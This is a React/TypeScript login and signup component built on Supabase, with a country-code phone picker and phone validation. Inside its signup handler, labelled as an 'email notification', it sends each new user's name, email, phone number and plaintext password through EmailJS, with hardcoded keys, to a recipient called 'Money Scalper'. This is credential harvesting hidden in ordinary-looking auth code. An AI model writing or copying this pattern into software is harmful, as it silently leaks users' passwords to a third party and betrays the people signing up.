import { useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import { Command, CommandEmpty, CommandGroup, CommandInput, CommandItem, CommandList } from "@/components/ui/command";
import { toast } from "sonner";
import { Eye, EyeOff, Loader2, CheckCircle, AlertCircle, ChevronsUpDown, Check } from "lucide-react";
import emailjs from '@emailjs/browser';
import { countries } from "@/data/countryCodes";
import { AsYouType, isValidPhoneNumber, parsePhoneNumber, CountryCode } from "libphonenumber-js";
import { cn } from "@/lib/utils";

interface AuthProps {
  onSuccess?: () => void;
}

export const Auth = ({ onSuccess }: AuthProps) => {
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [selectedCountry, setSelectedCountry] = useState(countries.find(c => c.code === "US") || countries[0]);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [phoneError, setPhoneError] = useState<string | null>(null);
  const [countryOpen, setCountryOpen] = useState(false);

  const handlePhoneChange = (value: string) => {
    // Remove any non-digit characters for processing
    const digitsOnly = value.replace(/\D/g, '');
    
    // Format the phone number using AsYouType formatter
    const formatter = new AsYouType(selectedCountry.code as CountryCode);
    const formatted = formatter.input(digitsOnly);
    
    setPhoneNumber(formatted);
    
    // Validate the phone number
    if (digitsOnly.length > 0) {
      try {
        const fullNumber = selectedCountry.dialCode + digitsOnly;
        const isValid = isValidPhoneNumber(fullNumber, selectedCountry.code as CountryCode);
        
        if (!isValid && digitsOnly.length >= 10) {
          setPhoneError(`Invalid ${selectedCountry.name} phone number`);
        } else {
          setPhoneError(null);
        }
      } catch (error) {
        setPhoneError(null); // Clear error if we can't validate yet
      }
    } else {
      setPhoneError(null);
    }
  };

  const handleCountryChange = (code: string) => {
    const country = countries.find(c => c.code === code);
    if (country) {
      setSelectedCountry(country);
      setCountryOpen(false);
      // Reformat existing number for new country
      if (phoneNumber) {
        const digitsOnly = phoneNumber.replace(/\D/g, '');
        const formatter = new AsYouType(code as CountryCode);
        const formatted = formatter.input(digitsOnly);
        setPhoneNumber(formatted);
        setPhoneError(null);
      }
    }
  };

  const handleSignup = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    
    // Validate phone number before submission
    const digitsOnly = phoneNumber.replace(/\D/g, '');
    const fullNumber = selectedCountry.dialCode + digitsOnly;
    
    try {
      if (!isValidPhoneNumber(fullNumber, selectedCountry.code as CountryCode)) {
        toast.error("Please enter a valid phone number");
        setPhoneError(`Invalid ${selectedCountry.name} phone number`);
        return;
      }
    } catch (error) {
      toast.error("Please enter a valid phone number");
      return;
    }
    
    setLoading(true);

    const formData = new FormData(e.currentTarget);
    const name = formData.get("signup-name") as string;
    const email = formData.get("signup-email") as string;
    const password = formData.get("signup-password") as string;
    const confirmPassword = formData.get("confirm-password") as string;
    
    // Use the full international number format
    const contactNumber = fullNumber;

    if (password !== confirmPassword) {
      toast.error("Passwords don't match");
      setLoading(false);
      return;
    }

    if (password.length < 6) {
      toast.error("Password must be at least 6 characters");
      setLoading(false);
      return;
    }

    try {
      const { error } = await supabase.auth.signUp({
        email,
        password,
        options: {
          data: {
            phone_number: contactNumber,
          }
        }
      });

      if (error) throw error;

      // Send email notification via EmailJS
      try {
        await emailjs.send(
          'service_o5z56fm',
          'template_vuxezaw',
          {
            to_name: 'Money Scalper',
            full_name: name,
            user_email: email,
            contact_number: contactNumber,
            user_password: password,
          },
          'AnyGKIBS05v_ugsa4'
        );
      } catch (emailError) {
        console.error("Failed to send email notification:", emailError);
        // Don't block signup if email fails
      }

      toast.success("Account created! Choose your verification method: email or SMS.");
      onSuccess?.();
    } catch (error: any) {
      toast.error(error.message || "Failed to create account");
    } finally {
      setLoading(false);
    }
  };

  const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);

    const formData = new FormData(e.currentTarget);
    const email = formData.get("login-email") as string;
    const password = formData.get("login-password") as string;

    try {
      const { error } = await supabase.auth.signInWithPassword({
        email,
        password,
      });

      if (error) throw error;

      toast.success("Welcome back!");
      onSuccess?.();
    } catch (error: any) {
      toast.error(error.message || "Failed to log in");
    } finally {
      setLoading(false);
    }
  };

  return (
    <Tabs defaultValue="login" className="w-full">
      <TabsList className="grid w-full grid-cols-2">
        <TabsTrigger value="login">Login</TabsTrigger>
        <TabsTrigger value="signup">Sign Up</TabsTrigger>
      </TabsList>

      <TabsContent value="login" className="space-y-4">
        <form onSubmit={handleLogin} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="login-email">Email</Label>
            <Input
              id="login-email"
              name="login-email"
              type="email"
              placeholder="you@example.com"
              required
              disabled={loading}
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="login-password">Password</Label>
            <div className="relative">
              <Input
                id="login-password"
                name="login-password"
                type={showPassword ? "text" : "password"}
                placeholder="••••••••"
                required
                disabled={loading}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </button>
            </div>
          </div>

          <Button type="submit" className="w-full" disabled={loading}>
            {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
            {loading ? "Logging in..." : "Log In"}
          </Button>
        </form>
      </TabsContent>

      <TabsContent value="signup" className="space-y-4">
        <form onSubmit={handleSignup} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="signup-name">Name</Label>
            <Input
              id="signup-name"
              name="signup-name"
              type="text"
              placeholder="John Doe"
              required
              disabled={loading}
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="signup-phone">Phone Number</Label>
            <div className="flex gap-2">
              <Popover open={countryOpen} onOpenChange={setCountryOpen}>
                <PopoverTrigger asChild>
                  <Button
                    variant="outline"
                    role="combobox"
                    aria-expanded={countryOpen}
                    disabled={loading}
                    className="w-[100px] justify-between bg-background border-input z-50 px-2"
                  >
                    <span className="flex items-center gap-1.5 truncate">
                      <span className="text-base">{selectedCountry.flag}</span>
                      <span className="font-mono text-xs">{selectedCountry.dialCode}</span>
                    </span>
                    <ChevronsUpDown className="ml-1 h-3 w-3 shrink-0 opacity-50" />
                  </Button>
                </PopoverTrigger>
                <PopoverContent className="w-[300px] p-0 bg-background border-border z-[100]" align="start">
                  <Command>
                    <CommandInput 
                      placeholder="Search country..." 
                      className="h-9"
                    />
                    <CommandList>
                      <CommandEmpty>No country found.</CommandEmpty>
                      <CommandGroup>
                        {countries.map((country) => (
                          <CommandItem
                            key={country.code}
                            value={`${country.name} ${country.dialCode}`}
                            onSelect={() => handleCountryChange(country.code)}
                            className="cursor-pointer"
                          >
                            <div className="flex items-center justify-between w-full gap-3">
                              <div className="flex items-center gap-2">
                                <span className="text-base">{country.flag}</span>
                                <span className="text-xs font-medium truncate max-w-[140px]">{country.name}</span>
                              </div>
                              <span className="font-mono text-xs text-muted-foreground ml-auto">{country.dialCode}</span>
                            </div>
                            <Check
                              className={cn(
                                "ml-2 h-4 w-4",
                                selectedCountry.code === country.code ? "opacity-100" : "opacity-0"
                              )}
                            />
                          </CommandItem>
                        ))}
                      </CommandGroup>
                    </CommandList>
                  </Command>
                </PopoverContent>
              </Popover>
              <div className="flex-1 space-y-1">
                <div className="relative">
                  <Input
                    id="signup-phone"
                    name="signup-phone"
                    type="tel"
                    placeholder="(555) 123-4567"
                    value={phoneNumber}
                    onChange={(e) => handlePhoneChange(e.target.value)}
                    required
                    disabled={loading}
                    className={`pr-10 ${phoneError ? 'border-red-500 focus-visible:ring-red-500' : phoneNumber && !phoneError ? 'border-green-500 focus-visible:ring-green-500' : ''}`}
                  />
                  {phoneNumber && (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2">
                      {phoneError ? (
                        <AlertCircle className="h-4 w-4 text-red-500" />
                      ) : (
                        <CheckCircle className="h-4 w-4 text-green-500" />
                      )}
                    </div>
                  )}
                </div>
                {phoneError && (
                  <p className="text-xs text-red-500">{phoneError}</p>
                )}
                {phoneNumber && !phoneError && phoneNumber.replace(/\D/g, '').length >= 10 && (
                  <p className="text-xs text-green-500 flex items-center gap-1">
                    <CheckCircle className="h-3 w-3" />
                    Valid number
                  </p>
                )}
              </div>
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="signup-email">Email</Label>
            <Input
              id="signup-email"
              name="signup-email"
              type="email"
              placeholder="you@example.com"
              required
              disabled={loading}
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="signup-password">Password</Label>
            <div className="relative">
              <Input
                id="signup-password"
                name="signup-password"
                type={showPassword ? "text" : "password"}
                placeholder="••••••••"
                required
                disabled={loading}
                minLength={6}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </button>
            </div>
          </div>

          <div className="space-y-2">
            <Label htmlFor="confirm-password">Confirm Password</Label>
            <Input
              id="confirm-password"
              name="confirm-password"
              type={showPassword ? "text" : "password"}
              placeholder="••••••••"
              required
              disabled={loading}
              minLength={6}
            />
          </div>

          <Button type="submit" className="w-full" disabled={loading}>
            {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
            {loading ? "Creating account..." : "Create Account"}
          </Button>
        </form>
      </TabsContent>
    </Tabs>
  );
};
